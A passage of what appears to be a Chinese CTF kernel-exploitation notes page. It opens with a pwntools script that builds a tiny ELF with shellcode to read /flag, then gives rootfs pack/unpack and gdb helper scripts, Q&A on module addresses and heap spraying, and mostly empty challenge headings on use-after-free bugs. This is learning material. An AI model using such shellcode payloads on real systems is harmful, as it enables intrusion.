<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># sc = asm(sc)</span>
</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x7F</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x45</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x4C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x46</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x02</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x02</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x3E</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x78</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x38</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x05</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x97</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x97</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x01</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">header</span><span class="p">)</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./elf&#34;</span><span class="p">,</span> <span class="s2">&#34;wb+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;,&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="脚本相关">脚本相关</h1>
<h2 id="ext2-文件解包">ext2 文件解包</h2>
<p>首先创建一个10块1M的ext2文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo dd if=/dev/zero of=/home/ubuntu/download/pwn/zer0ctf/new_rootfs.ext2 bs=1M count=10
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir core
</span></span><span class="line"><span class="cl">mkdir core1
</span></span><span class="line"><span class="cl">sudo mount -o loop rootfs.ext2 ./core # origin filesystem
</span></span><span class="line"><span class="cl">sudo mount -o loop new_rootfs.ext2 ./core1 
</span></span><span class="line"><span class="cl">sudo cp -a ./core/* ./core1/
</span></span><span class="line"><span class="cl">sudo umount core1
</span></span><span class="line"><span class="cl">sudo umount core
</span></span><span class="line"><span class="cl">sudo mv new_rootfs.ext2 rootfs.ext2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="packsh">pack.sh</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>gcc <span class="nv">$1</span> -o exp --static <span class="o">&amp;&amp;</span> find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.cpio <span class="o">&amp;&amp;</span> <span class="nb">pushd</span> ../ <span class="o">&amp;&amp;</span> ./run.sh <span class="o">&amp;&amp;</span> <span class="nb">popd</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="unpacksh">unpack.sh</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cpio -idmv &lt; ../rootfs.cpio
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gdbsh">gdb.sh</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo gdb ./vmlinux -ex <span class="s2">&#34;target remote :1234&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="qa">QA</h3>
<p>Q: if lsmod display that,how to get address?</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234157391.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234157391.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234157391.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234157391.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234157391.png"
        title="image-20241030234157391" /></p>
<p>A:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /sys/module/flipper/sections &amp;&amp; cat .data 
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果还是没有那就只能gef里面执行kmod获取地址，base极为mod的地址</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234430658.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234430658.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234430658.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234430658.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241030234430658.png"
        title="image-20241030234430658" /></p>
<p>Q: when can use page allocate aka page fengshuii
A: heap overflow (off by null| off by x| flip)</p>
<h1 id="kernel题目">kernel题目</h1>
<h2 id="ebpf">ebpf</h2>
<h3 id="httpsgithubcomchujdkd3ctf2022-pwn-d3bpf-and-v2"><a href="https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2" target="_blank" rel="noopener noreffer ">https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2</a></h3>
<h2 id="qwbs8">qwbs8</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone git://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/focal
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> focal
</span></span><span class="line"><span class="cl">git checkout Ubuntu-hwe-5.15-5.15.0-127.137_20.04.1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="l3hctf-kpid-pid-uaf-的利用">l3hctf kpid (pid uaf 的利用)</h2>
<h3 id="题目分析">题目分析</h3>
<h3 id="0x69003">0x69003</h3>
<p>执行put_pid</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223021904.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223021904.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223021904.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223021904.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223021904.png"
        title="image-20241101223021904" /></p>
<h3 id="0x47001">0x47001</h3>
<p>申请pid</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223058611.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223058611.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223058611.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223058611.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223058611.png"
        title="image-20241101223058611" /></p>
<h3 id="0x58002">0x58002</h3>
<p>将pid号给用户态传递</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223107559.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223107559.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223107559.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223107559.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241101223107559.png"
        title="image-20241101223107559" /></p>
<h3 id="bug">bug</h3>
<h2 id="m0ctf-file-struct-uaf的利用">m0ctf (file struct uaf的利用)</h2>
<h2 id="n1ctf-kfile-file_struct-uaf的利用">n1ctf kfile (file_struct uaf的利用)</h2>
<h2 id="n1ctf-heap_master-独立cache的uaf只能一次free-外加nsjail">n1ctf heap_master (独立cache的uaf,只能一次free 外加nsjail)</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span></code></pre></td>
